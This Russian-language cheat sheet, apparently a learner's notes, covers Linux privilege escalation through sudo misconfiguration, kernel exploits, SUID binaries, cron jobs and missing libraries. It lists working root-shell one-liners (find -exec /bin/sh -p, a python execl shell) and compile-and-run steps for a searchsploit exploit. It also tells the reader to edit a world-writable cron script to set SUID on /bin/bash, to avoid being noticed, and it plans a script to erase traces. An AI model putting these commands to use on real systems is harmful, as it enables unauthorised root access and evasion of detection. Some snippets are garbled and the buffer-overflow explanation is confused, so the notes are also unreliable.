
██████╗░██╗░░░██╗███╗░░░███╗██████╗░██╗░░██╗██╗███╗░░██╗  ██╗░░░██╗░█████╗░  ██████╗░░█████╗░██████╗░░█████╗░
██╔══██╗██║░░░██║████╗░████║██╔══██╗██║░██╔╝██║████╗░██║  ╚██╗░██╔╝██╔══██╗  ██╔══██╗██╔══██╗██╔══██╗██╔══██╗
██████╔╝██║░░░██║██╔████╔██║██████╔╝█████═╝░██║██╔██╗██║  ░╚████╔╝░███████║  ██║░░██║███████║██║░░██║███████║
██╔═══╝░██║░░░██║██║╚██╔╝██║██╔═══╝░██╔═██╗░██║██║╚████║  ░░╚██╔╝░░██╔══██║  ██║░░██║██╔══██║██║░░██║██╔══██║
██║░░░░░╚██████╔╝██║░╚═╝░██║██║░░░░░██║░╚██╗██║██║░╚███║  ░░░██║░░░██║░░██║  ██████╔╝██║░░██║██████╔╝██║░░██║
╚═╝░░░░░░╚═════╝░╚═╝░░░░░╚═╝╚═╝░░░░░╚═╝░░╚═╝╚═╝╚═╝░░╚══╝  ░░░╚═╝░░░╚═╝░░╚═╝  ╚═════╝░╚═╝░░╚═╝╚═════╝░╚═╝░░╚═╝


█░░ █ █▄░█ █░█ ▀▄▀   █▀█ █▀█ █ █░█ █ █░░ █▀▀ █▀▀ █▀▀   █▀▀ █▀ █▀▀ ▄▀█ █░░ ▄▀█ ▀█▀ █ █▀█ █▄░█   ▀█▀ █▀▀ █▀▀ █░█ █▄░█ █ █▀█ █░█ █▀▀ █▀
█▄▄ █ █░▀█ █▄█ █░█   █▀▀ █▀▄ █ ▀▄▀ █ █▄▄ ██▄ █▄█ ██▄   ██▄ ▄█ █▄▄ █▀█ █▄▄ █▀█ ░█░ █ █▄█ █░▀█   ░█░ ██▄ █▄▄ █▀█ █░▀█ █ ▀▀█ █▄█ ██▄ ▄█


> ## Sudo Misconfiguration

Это ошибка в настройках /etc/sudoers, когда пользователь получает права суперпользователя (root)
что может быть использовано для повышения привилегий.
Например, использование NOPASSWD позволяет пользователю выполнять команды без ввода пароля
что может привести к эксплуатации уязвимостей.

Примеры:
- \```user_name ALL=(ALL) NOPASSWD: /bin/bash\```
- \```sudo -l 
   sudo -u name-root
   sudo -u name-root /bin/cat  /challenge/app-script/ch1/notes/../ch1cked/.passwd\```
- \```python3.11 -c ’import os; os.execl(”/bin/shp”, ”sh” ”-p”)’\```
- \```find / -exec /bin/sh -p \```


> ## Kernel Exploits

Используют уязвимости в ядре операционной системы для получения привилегий администратора (root).
Это может включать неправильные проверки прав доступа или ошибки в обработке системных вызовов
которые позволяют атакующему получить доступ к привилегированным ресурсам.

Примеры: 
- \```searchsploit linux root kernel\``` (Можно указать версию ядра, и тип уязвимости например sudo или kernel ) 
   либо использование wget ...
   \```
   cp /Linux/remote/80.c  /home/user/
   cd /home/user/ 
   chmod +x 80.c
   gcc 80.c -o exp.a
   ./exp.a 
   \```

> ## Buffer overflow

Переполнение буфера
Происходит, когда программа записывает данные для ограничения выделенной памяти, что может перезаписать важные данные, включая возврат адреса. Это может быть использовано для выполнения конкурентного кода с повышенными привилегиями, например, для получения прав суперпользователя.
чтобы открыть файл от лица супер пользователя можно поменять SUID-бит или SGID-бит
Примеры:
- Установить SUID бит 
    \```chmod u+s имя_файла
    Установить SGID бит 
    chmod g+s имя_файла\```

- Перезаполнение SUID/SGID битов (пример кода от чата гпт)
    у нас есть программа 
\```С++

    #include <stdio.h>
    #include <stdlib.h>

    int main() {
        char filename[256];
        printf("Enter filename to read: ");
        gets(filename);  // Используется небезопасная функция gets
        FILE *file = fopen(filename, "r");
        if (file) {
            char c;
            while ((c = fgetc(file)) != EOF) {
                putchar(c);
            }
            fclose(file);
        } else {
            perror("Error opening file");
        }
        return 0;
    }

\```
    После его нужно скомпилировать 
    \```gcc -o vulnerable_program vulnerable_program.c\```
    После компиляции установите SUID бит:
    \```chmod u+s vulnerable_program\```
    В этом случае программа уязвима к "перезаполнению" (или "перезаписи") буфера, так как она использует gets для ввода имени файла. Атакующий может попытаться воспользоваться этим, чтобы передать имя файла, на которое у него есть доступ, например, приступая к чтению файлов, к которым у него нет прямого доступа.
    Атакующий может создать файл с именем, который он хочет прочитать, например, /etc/passwd, и затем запустить vulnerable_program.
    В данном случае, если программа выполнена с правами root, она позволит атакующему читать содержимое файла /etc/passwd, даже если у него нет прав к этому файлу.

> ## SUID

Имея доступ к определённым командам с активированным SUID битом, можно повысить привилегии без необходимости быть root. К таким командам относятся, например, `cat`, `bash`, `cp`, `find`, `echo`, `nmap`, `nano`, `vim` и другие, которые могут использоваться для выполнения действий с правами суперпользователя.
Примеры:
-   Вот код который поможет в этом 
    \```sudo chmod u+s /usr/bin/find
    touch file
    find file -exec whoami \;\```

> ## Cron 

Cron — это фоновый процесс в Unix-подобных системах, который выполняет задачи по расписанию. Он позволяет автоматизировать выполнение команд или скриптов в определённое время.
Crontab — это конфигурационный файл для настройки задач cron. В нём можно указать, какие команды и когда должны выполняться. Каждый пользователь может иметь свой файл crontab, чтобы настроить автоматические задачи для себя.
Пример записи в crontab:
\```30 2 * * * /path/to/script.sh\```
Это выполнит script.sh каждый день в 2:30.
Примеры:
-  Например узнаём какой скрипт работает с Cron
    \```cat /etc/crontab\```
    ищем файл и смотрим что да как и какие права 777 (чтобы мы могли изменять его)
    ищем потом уязвимость в файле (по ситуации может только cat будет хватать )
    потом читаем код и изменяем его так чтобы он менял права нужного нам файла 
    например через nano или vi/vim редактируем код так чтобы он давал права 
    \```chmod u+s /bin/bash.\```
    всё только главное чтобы скрипт сильно важным небыл и сильно не палиться чтобы 
    (в планах сделать скрипт который будет подчищать за вами следы )


> ## Missing libraries

Если кратко то часто бывает что нету библиотеки для запуска или работы софта 
мы можем возспользоваться этим 
например мы узнали что есть идеальная программа с крутыми привилегиями 
но только нету библиотеки ... тогда сами пишем библиотеку
где и будет уязвимость 
это долговато разбирать но примеры в интернете есть 
самое главное это понять какие дериктории смотреть 
например ld.so.conf.d. Там мы можем найти информацию о подгружаемых библиотеках 
и уже дальше смотреть что да как 
